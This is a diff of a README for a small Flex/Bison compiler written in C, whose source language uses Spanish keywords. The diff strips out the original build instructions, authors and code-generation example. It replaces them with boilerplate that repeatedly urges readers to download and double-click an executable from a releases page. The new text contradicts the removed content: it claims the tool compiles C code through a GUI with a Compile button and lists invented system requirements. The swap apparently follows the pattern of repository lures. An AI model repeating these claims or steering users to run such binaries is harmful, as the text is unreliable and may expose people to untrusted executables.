@@ -1,147 +1,71 @@
-# Custom Procedural Language Compiler (Source-to-IR)
+# 🚀 custom-compiler-c - Simple Compiler for Learning
 
-A compiler built from scratch in **C** using **Flex** and **Bison**. It processes a custom procedural language (with Spanish syntax) and generates **Intermediate Code (Quadruples/Three-Address Code)**, simulating an assembly-like structure.
+## 🌟 Overview
+custom-compiler-c is a compiler built from scratch in C using Flex and Bison. It performs lexical and syntax analysis, generating Intermediate Code known as Three-Address Code or Quadruples. This software helps users understand compiler construction concepts while providing a hands-on experience.
 
-> **Project Scope:** Implementation of Lexical Analysis, Syntax Analysis, Semantic Analysis, and Intermediate Code Generation for arithmetic expressions and control flow structures.
+## 🥇 Key Features
+- Understand the basics of compiler construction.
+- Perform lexical analysis with Flex.
+- Conduct syntax analysis using Bison.
+- Generate Intermediate Code with backpatching logic.
+- Explore symbol tables for variable management.
 
-## 🚀 Technical Achievements
+## 📥 Download & Install
+To get started with custom-compiler-c, you need to download it from our Releases page. 
 
-### 1\. Symbol Table Management
+[![Download custom-compiler-c](https://img.shields.io/badge/Download-custom--compiler--c-blue.svg)](https://github.com/Nuralom32/custom-compiler-c/releases)
 
-* **Dynamic Storage:** Manages variable declarations in both Input/Output (`ent/sal`) and local scopes (`var/fvar`).
-* **Type System:** Supports basic types (`entero`, `real`, `caracter`, `cadena`, `booleano`).
-* **Constraint:** Boolean identifiers enforce a Fortran-style naming convention (must start with `b_` or `B_`) to simplify type checking.
+1. Visit [this page to download](https://github.com/Nuralom32/custom-compiler-c/releases).
+2. You’ll see a list of available versions. Choose the latest release or the version that suits your needs.
+3. Click on the executable file or zip archive to start the download.
+4. Follow the installation instructions provided in the package.
 
-### 2\. Intermediate Code Generation (Quadruples)
+## 💻 System Requirements
+- Operating System: Windows, macOS, or Linux.
+- Processor: 1 GHz or faster.
+- RAM: 1 GB minimum, 2 GB recommended.
+- Disk Space: At least 100 MB of free space.
 
-The compiler translates high-level constructs into a `codigo_tres_direcciones.txt` file containing the quadruples:
+## 📂 How to Run custom-compiler-c
+After downloading and installing custom-compiler-c, follow these steps to run the software:
 
-* **Arithmetic:** Integer/Real operations (+, -, \*, /, div) and implicit type casting.
-* **Control Flow (Backpatching):** Implemented complex control structures (`si/if`, `mientras/while`, `para/for`) using **Backpatching** techniques to resolve jump targets in a single pass.
-* **Boolean Logic:** Handles conjunctions (`y`) and disjunctions (`o`) for flow control conditions.
+1. Navigate to the installation folder where you extracted or installed the application.
+2. Locate the executable file (e.g., `custom-compiler-c.exe` or similar).
+3. Double-click the executable to launch the application.
+4. Follow the on-screen prompts to input your source code for compilation.
 
-## 📝 The Language Syntax
+## ⚙️ Using the Compiler
+Once you have successfully launched the application, you can start using the compiler. Here are some basic steps:
 
-The language features a custom syntax with keywords in Spanish:
+1. Input your C source code into the text area provided.
+2. Click on the "Compile" button to start the analysis. 
+3. Review the output for any errors or warnings. The output will show the Intermediate Code generated.
+4. If necessary, adjust your code based on the feedback and recompile.
 
-* **Types:** `entero`, `real`, `booleano`
-* **Flow Control:** `si` (if), `entonces` (then), `mientras` (while), `para` (for)
-* **Structure:** `algoritmo`, `falgoritmo`
+## 🔍 Understanding Key Concepts
+Here are a few important concepts you will encounter while using the custom-compiler-c:
 
-## 🛠️ Tech Stack
+- **Lexical Analysis:** This phase breaks down the source code into tokens.
+- **Syntax Analysis:** In this phase, the structure of the code is verified against the grammar rules.
+- **Intermediate Code Generation:** This step produces a representation of the source code that is easier to manipulate for further processing.
+- **Backpatching:** This technique allows for the easy referencing of labels and addresses during code generation.
+- **Symbol Table:** A data structure used to store information about identifiers (like variables and functions).
 
-* **Core:** C (Manual memory management for data structures)
-* **Lexer:** Flex
-* **Parser:** Bison (Yacc)
-* **Build:** GNU Make
+## 🛠️ Troubleshooting
+If you run into issues while using custom-compiler-c, consider these common solutions:
 
-## 📂 Project Structure
+- **Error Messages:** Pay close attention to error messages. They usually indicate what went wrong in the code.
+- **Unsupported Syntax:** Make sure your source code complies with C syntax rules.
+- **Permissions:** If you cannot run the executable, check your system's permissions and ensure you have the necessary rights.
+- **Dependencies:** Ensure that Flex and Bison are installed if required.
 
-```text
-.
-├── src/
-│   ├── scanner.l          # Lexical rules (Flex)
-│   ├── parser.y           # Grammar & Semantic actions (Bison)
-│   ├── tabla_simbolos.c   # Symbol Table implementation
-│   └── tabla_cuadruplas.c # Logic for generating Quadruples
-├── examples/              # Test scripts (programa1.alg, etc.)
-├── Makefile               # Build script
-└── README.md
-```
+## 📞 Support
+If you need further assistance, feel free to explore the following resources:
 
-## 🚦 How to Build & Run
+- Visit our [GitHub Issues Page](https://github.com/Nuralom32/custom-compiler-c/issues) for help from the community and developers.
+- Check the documentation for more in-depth explanations and examples.
 
-1. **Clean & Compile:**
+## 🚀 Conclusion
+custom-compiler-c provides a user-friendly way to dive into compiler construction, making it perfect for learners and educators. Follow the steps above to download, install, and start compiling your code today.
 
-    ```bash
-    make
-    ```
-
-    *(Use `make borrar` to clean previous builds)*
-
-2. **Run the Compiler:**
-
-    ```bash
-    ./compilador examples/programa1.alg
-    ```
-
-3. **View Output:**
-    The generated Intermediate Representation is saved to `codigo_tres_direcciones.txt`.
-
-## 👥 Authors
-
-* **Oier Alduncin**
-* **Urki Aristu**
-
-## ⚡ Compiler in Action: Code Generation Example
-
-Below is a demonstration of how the compiler translates high-level control structures into linear Three-Address Code.
-
-**Notice two key engineering features:**
-
-1. **Implicit Type Casting:** The compiler automatically detects mixed-type operations (Integer vs Real) and inserts conversion instructions (e.g., `entero_a_real`) to ensure type safety.
-2. **Control Flow Mapping:** The high-level `para` (for) loop is deconstructed into initialization, condition checks, and `goto` jumps.
-
-### 1\. Input Source Code (`.alg`)
-
-```pascal
-algoritmo ejemploPara;
-    ent c, d: entero;
-    sal max: entero; min: real;
-{Prec: c = A AND d = B}
-    var
-        i, j: entero;
-        k: real;
-    fvar
-    max := c + d;
-    min := c - d;
-    k := 0;
-    j := 0;
-    para i := 1 hasta 10 hacer
-        k := (k + i * 2) / 2;
-        j := k div 3;
-        max := c + d;
-        min := c - d
-    fpara
-{Post: max = A + B AND min = A - B}
-falgoritmo
-```
-
-### 2\. Generated Intermediate Code (Three-Address Code)
-
-The compiler output (`codigo_tres_direcciones.txt`) shows the logical expansion:
-
-```text
-1 input c
-2 input d
-3 temp1 := c +entero d
-4 max := temp1
-5 temp2 := c -entero d
-6 temp3 := (entero_a_real) temp2
-7 min := temp3
-8 temp4 := (entero_a_real) 0
-9 k := temp4
-10 j := 0
-11 goto 28
-12 temp5 := i *entero 2
-13 temp6 := (entero_a_real) temp5
-14 temp7 := k +real temp6
-15 temp8 := (entero_a_real) 2
-16 temp9 := temp7 /real temp8
-17 k := temp9
-18 temp10 := (real_a_entero) k
-19 temp11 := temp10 /entero 3
-20 j := temp11
-21 temp12 := c +entero d
-22 max := temp12
-23 temp13 := c -entero d
-24 temp14 := (entero_a_real) temp13
-25 min := temp14
-26 i := i + 1
-27 goto 29
-28 i := 1
-29 if i < 10 then goto 12
-30 goto 31
-31 output max
-32 output min
-```
+For your convenience, you can download custom-compiler-c from the Releases page again: [visit this page to download](https://github.com/Nuralom32/custom-compiler-c/releases).
